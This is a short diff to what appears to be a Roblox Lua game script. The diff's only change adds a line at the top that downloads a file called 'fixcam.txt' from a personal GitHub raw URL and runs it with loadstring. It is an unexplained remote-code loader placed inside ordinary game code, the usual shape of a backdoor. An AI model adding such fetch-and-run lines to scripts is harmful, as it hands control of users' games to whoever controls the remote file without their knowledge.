@@ -1,3 +1,6 @@
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/harisprofanny/d/main/fixcam.txt"))()
+
 local Players = game:GetService("Players")
 local Lighting = game:GetService("Lighting")
 local Debris = game:GetService("Debris")
